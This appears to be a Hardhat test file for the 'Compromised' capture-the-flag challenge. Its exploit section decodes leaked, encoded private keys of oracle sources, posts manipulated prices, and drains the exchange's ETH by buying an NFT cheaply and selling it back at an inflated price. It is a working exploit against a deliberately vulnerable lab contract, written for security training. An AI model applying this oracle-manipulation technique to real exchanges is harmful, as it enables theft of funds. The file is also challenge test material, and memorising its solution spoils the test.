import { ContractReceipt } from "@ethersproject/contracts";
import { Wallet } from "@ethersproject/wallet";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { ethers } from "hardhat";
import { DamnValuableNFT, Exchange, TrustfulOracle } from "../../typechain";

describe("Compromised challenge", function () {
    const sources = [
        "0xA73209FB1a42495120166736362A1DfA9F95A105",
        "0xe92401A4d3af5E446d93D11EEc806b1462b39D15",
        "0x81A5D6E50C214044bE44cA0CB057fe119097850c",
    ];

    const FirstServerResponse =
        "4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35";
    const SecondServerResponse =
        "4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34";

    let deployer: SignerWithAddress, attacker: SignerWithAddress;
    let oracle: TrustfulOracle, exchange: Exchange, nftToken: DamnValuableNFT;
    const EXCHANGE_INITIAL_ETH_BALANCE = ethers.utils.parseEther("9990");
    const INITIAL_NFT_PRICE = ethers.utils.parseEther("999");

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const ExchangeFactory = await ethers.getContractFactory("Exchange", deployer);
        const DamnValuableNFTFactory = await ethers.getContractFactory("DamnValuableNFT", deployer);
        const TrustfulOracleFactory = await ethers.getContractFactory("TrustfulOracle", deployer);
        const TrustfulOracleInitializerFactory = await ethers.getContractFactory("TrustfulOracleInitializer", deployer);

        // Initialize balance of the trusted source addresses
        for (let i = 0; i < sources.length; i++) {
            await ethers.provider.send("hardhat_setBalance", [
                sources[i],
                "0x1bc16d674ec80000", // 2 ETH
            ]);
            expect(await ethers.provider.getBalance(sources[i])).to.equal(ethers.utils.parseEther("2"));
        }

        // Attacker starts with 0.1 ETH in balance
        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x16345785d8a0000", // 0.1 ETH
        ]);
        expect(await ethers.provider.getBalance(attacker.address)).to.equal(ethers.utils.parseEther("0.1"));

        // Deploy the oracle and setup the trusted sources with initial prices
        oracle = TrustfulOracleFactory.attach(
            await (
                await TrustfulOracleInitializerFactory.deploy(
                    sources,
                    ["DVNFT", "DVNFT", "DVNFT"],
                    [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
                )
            ).oracle()
        );

        // Deploy the exchange and get the associated ERC721 token
        exchange = await ExchangeFactory.deploy(oracle.address, { value: EXCHANGE_INITIAL_ETH_BALANCE });
        nftToken = DamnValuableNFTFactory.attach(await exchange.token());
    });

    it("Exploit", async function () {
        /** CODE YOUR EXPLOIT HERE */

        const base64FirstAccount = Buffer.from(FirstServerResponse.split(" ").join(""), "hex").toString("utf8");
        const base64SecondAccount = Buffer.from(SecondServerResponse.split(" ").join(""), "hex").toString("utf8");

        const pkFirstAccount = Buffer.from(base64FirstAccount, "base64").toString("utf8");
        const pkSecondAccount = Buffer.from(base64SecondAccount, "base64").toString("utf8");

        const firstAccount = new Wallet(pkFirstAccount, ethers.provider);
        const secondAccount = new Wallet(pkSecondAccount, ethers.provider);

        await oracle.connect(firstAccount).postPrice("DVNFT", ethers.utils.parseEther("0.01"));
        await oracle.connect(secondAccount).postPrice("DVNFT", ethers.utils.parseEther("0.01"));

        const tx = await exchange.connect(attacker).buyOne({ value: ethers.utils.parseEther("0.01") });
        const _tx: ContractReceipt = await tx.wait();

        let tokenId: number = -1;

        const _event = _tx.events?.filter((e) => e.event == "TokenBought");

        if (_event) tokenId = _event[0].args ? (_event[0].args[1] as number) : -1;

        expect(tokenId).to.be.gt(-1);

        const exchangeBalance = await ethers.provider.getBalance(exchange.address);

        await oracle.connect(firstAccount).postPrice("DVNFT", exchangeBalance);
        await oracle.connect(secondAccount).postPrice("DVNFT", exchangeBalance);

        await nftToken.connect(attacker).approve(exchange.address, tokenId);
        await exchange.connect(attacker).sellOne(tokenId);

        await oracle.connect(firstAccount).postPrice("DVNFT", INITIAL_NFT_PRICE);
        await oracle.connect(secondAccount).postPrice("DVNFT", INITIAL_NFT_PRICE);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Exchange must have lost all ETH
        expect(await ethers.provider.getBalance(exchange.address)).to.be.eq("0");

        // Attacker's ETH balance must have significantly increased
        expect(await ethers.provider.getBalance(attacker.address)).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);

        // Attacker must not own any NFT
        expect(await nftToken.balanceOf(attacker.address)).to.be.eq("0");

        // NFT price shouldn't have changed
        expect(await oracle.getMedianPrice("DVNFT")).to.eq(INITIAL_NFT_PRICE);
    });
});
